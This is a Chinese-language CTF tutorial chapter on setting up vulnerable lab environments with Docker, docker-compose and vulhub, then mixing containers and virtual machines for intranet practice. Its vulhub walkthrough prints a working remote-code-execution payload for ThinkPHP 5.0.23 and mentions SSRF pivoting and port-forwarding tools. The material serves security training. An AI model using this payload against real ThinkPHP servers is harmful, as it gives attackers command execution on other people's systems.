---
comments: true
---

# Docker与漏洞环境

在前面各个漏洞章节的例题里，我们其实一直在和"环境"打交道：要么是比赛方给了一个远程地址，要么是给了源码附件让我们本地搭建。如果你每次都靠手工装 PHP、配 Apache，光配环境就能把做题的热情耗光。

这一章讲一件一劳永逸的事：用 Docker 在几分钟内拉起一个漏洞环境。它是进阶专题「云与容器安全」的前置——想搞懂容器逃逸、K8s 渗透，先得知道容器是怎么跑起来的。

## Docker 基础：够用即止

### 镜像与容器：模具和产品

Docker 里有两个最核心的概念：

- **镜像（Image）**：一个打包好的只读模板，里面装着操作系统环境、依赖库和应用程序。比如 `php:8.1-apache` 这个镜像，就是"Debian + Apache + PHP 8.1"的完整组合。
- **容器（Container）**：镜像运行起来后的实例。镜像好比模具，容器好比用模具批量生产的产品——同一个镜像可以跑出多个互相隔离的容器。

和传统虚拟机相比，容器共用宿主机的内核，启动以秒计、开销极小，所以特别适合"用完即毁"的漏洞复现场景。对 CTF 选手来说，记住一句话就够了：**镜像是从仓库拉下来（pull）的，容器是从镜像跑起来（run）的，删容器不心疼。**

### 常用命令

日常搭建靶场，下面这些命令能覆盖九成场景：

```bash
# 拉取镜像
docker pull php:8.1-apache

# 查看本地已有镜像
docker images

# 跑一个容器：把本机 8080 端口映射到容器内 80 端口
docker run -d -p 8080:80 --name myweb php:8.1-apache

# 查看正在运行的容器（加 -a 可看已停止的）
docker ps

# 进入容器内部执行命令（最常用：进 shell 看源码、看 flag 位置）
docker exec -it myweb bash

# 查看容器日志（排查启动失败很有用）
docker logs myweb

# 停止 / 删除容器
docker stop myweb
docker rm myweb

# 删除镜像
docker rmi php:8.1-apache
```

几个高频参数：

- `-d`：后台运行（detached），不加的话容器退出终端就关了。
- `-p 8080:80`：端口映射，格式是 `宿主机端口:容器端口`。多个容器冲突时改左边即可。
- `--name`：给容器起个名字，不然 docker 会随机生成一个。
- `-v 宿主机路径:容器路径`：挂载目录，常用于把本地源码挂进容器里实时调试。

### docker-compose 入门

很多漏洞环境不止一个容器——比如 Web 容器 + MySQL 容器。手写一长串 `docker run` 又要配网络又要配依赖顺序，很麻烦。`docker-compose`（新版本集成在 `docker compose` 里）用一个 YAML 文件描述整个环境，一键拉起：

```yaml
# docker-compose.yml 示例：Web + 数据库
services:
  web:
    image: php:8.1-apache
    ports:
      - "8080:80"
    depends_on:
      - db
  db:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: ctf
```

配套命令只有三条最常用：

```bash
docker compose up -d      # 按 yml 文件拉起所有服务
docker compose ps         # 查看这组容器状态
docker compose down       # 一键停掉并清理（漏洞复现完就用它）
```

到这里，Docker 知识已经够用了。接下来我们直接进入实战。

## 用 vulhub 复现一个经典漏洞

[vulhub](https://github.com/vulhub/vulhub) 是一个开源的预构建漏洞环境仓库，几百个历史漏洞都用 Docker 打好了包，每条目录下附带 README 说明。我们以非常经典的 **ThinkPHP 5.0.23 RCE**（对应 vulhub 的 `thinkphp/5.0.23-rce` 目录）为例，完整走一遍流程。

### 第一步：拉取并启动环境

```bash
git clone --depth 1 https://github.com/vulhub/vulhub.git
cd vulhub/thinkphp/5.0.23-rce
docker compose up -d
```

第一次会下载镜像，等几分钟。完成后查看状态：

```bash
docker compose ps
```

README 会告诉你服务开在哪个端口（本例为 8080），浏览器访问 `http://你的IP:8080`，能看到 ThinkPHP 默认页面，说明环境就绪。

### 第二步：分析并利用漏洞

ThinkPHP 5.0.23 的缺陷出在 `Request` 类的 `method()` 方法：攻击者可以伪造请求方法，进而通过构造的特殊路由调用任意类的任意方法。复现只需要一个 GET 请求，直接调用 `call_user_func_array` 执行系统命令：

```http
GET /index.php?s=captcha HTTP/1.1
Host: 你的IP:8080

POST 体：
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

复现的关键是观察回显里有没有 `id` 命令的输出（`uid=33(www-data) ...`）。如果你看完漏洞原理还是想不通构造过程，可以先回过头去看本书的「RCE」和「PHP特性与常见绕过」章节——命令注入类漏洞的套路在那里讲得更系统。

### 第三步：收 shell 或读 flag

在真实靶场里，flag 通常放在容器内的 `/flag` 或 `/flag.txt`。既然已经能执行命令：

```bash
# 直接读 flag
cat /flag
```

或者在复现验证时，换用更稳妥的思路——用 `docker exec` 进容器对照源码，确认漏洞触发点在哪个文件、参数从哪进来：

```bash
docker compose exec web bash
cat /var/www/html/thinkphp/library/think/Request.php
```

这种"从外部打 + 从内部看"的双视角，是把一道题吃透的最快方式。

### 第四步：一键销毁

```bash
docker compose down
```

容器和临时文件全部清理，不占资源不留坑。这就是 Docker 复现的完整闭环：**拉环境 → 打漏洞 → 对照源码 → 销毁**。

## 自搭靶场：把比赛源码打包成 Dockerfile

比赛结束后想复盘、或者出题人只给了源码压缩包，就需要自己动手搭环境。思路是"最少三件套"：**选好基础镜像 → 拷贝源码 → 装依赖起服务**。

以一道典型的 PHP+MySQL 题目为例。拿到源码后先看三件事：

- 用什么语言/框架（决定基础镜像：`php:8.1-apache`、`python:3.11`、`node:20`……）
- 要不要数据库（需要就写 compose 文件）
- 有没有初始化脚本（比如建表 SQL、生成 flag 的脚本）

Web 容器最小 Dockerfile：

```dockerfile
FROM php:8.1-apache

# 安装 PHP 扩展（按需，这里只需要 mysqli）
RUN docker-php-ext-install mysqli

# 拷贝源码到 Web 根目录
COPY ./src/ /var/www/html/

# 拷贝 flag，并设为只读（防选手随便删）
COPY flag /flag
RUN chmod 444 /flag
```

配合数据库的 compose 文件：

```yaml
services:
  web:
    build: .
    ports:
      - "8080:80"
    environment:
      FLAG: flag{this_is_a_test}   # 通过环境变量下发 flag，源码里 getenv('FLAG') 读取
    depends_on:
      - db
  db:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: ctf
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql  # 首次启动自动执行建表
```

```bash
docker compose up -d --build   # 构建并启动
```

复盘时建议顺便做一次"白盒审计"：把源码在宿主机上用编辑器打开，对照本书「PHP代码审计」章节的方法逐文件过一遍，再进容器里动态验证。这样搭环境本身就是在做题。

几个实用小技巧：

- 本地改源码想实时生效，用 `-v ./src:/var/www/html` 挂载，不用反复重建。
- 镜像太大就换 `-alpine` 版本，比如 `php:8.1-apache-alpine`。
- 比赛环境常常"藏 flag"，复刻时注意 flag 的下发方式（环境变量 / 文件 / 数据库字段），这本身就是考点。

## 容器+虚拟机混合模拟：内网场景练习

有些题目不只是打一个 Web，还要"打进去再横向"。纯容器能做简单内网，但遇到需要完整系统服务（比如 Windows 域控、特殊服务）的场景，容器就不够用了。这时候用"**Web 在容器、内网主机在虚拟机**"的混合方案。

典型组合：

- 宿主机上起 Docker 容器跑 Web 应用（或整个渗透链的第一台跳板机）。
- 用 VirtualBox / VMware 起一台虚拟机，模拟内网里的第二台主机。
- 关键在网络：把虚拟机的网卡设为 **Host-only**（仅主机模式）或 **Internal Network**，让它和宿主机（以及宿主机上的容器网络）互通，但不直接连外网——这才像"内网"。

比如你想复刻"Web 入口 → SSRF 打内网"的场景：

1. 容器里跑一个带 SSRF 漏洞的 Web（参考本书「SSRF注入」章节）。
2. 虚拟机里起一个只监听内网网卡的 HTTP 服务，放上"内网 flag"。
3. 通过 SSRF 让 Web 服务器去请求虚拟机的内网地址，验证能不能拿到 flag。

再进一步，可以把第一台机器也做成"被拿下后要提权/横向"的跳板，练习端口转发（`frp`、`chisel`）、代理链。Docker 负责"快"，虚拟机负责"真"，两者配合能把一个完整的内网渗透链路搭在家里。

## 小结：会搭 → 会打 → 会逃

本章的关键词就三个：

- **会搭**：用 Docker/docker-compose 快速拉起任何漏洞环境，不再被环境配置劝退。
- **会打**：用 vulhub 之类的现成环境反复练习经典漏洞，把「RCE」「SSRF注入」等章节的知识落到手上。
- **会逃**：这是下一专题「云与容器安全」的主角——当你已经熟悉容器怎么跑、网络和文件系统怎么隔离之后，就能理解"容器逃逸"到底逃的是什么、云环境下的攻击面在哪。

环境搭得快，题目才刷得动。下一章见。
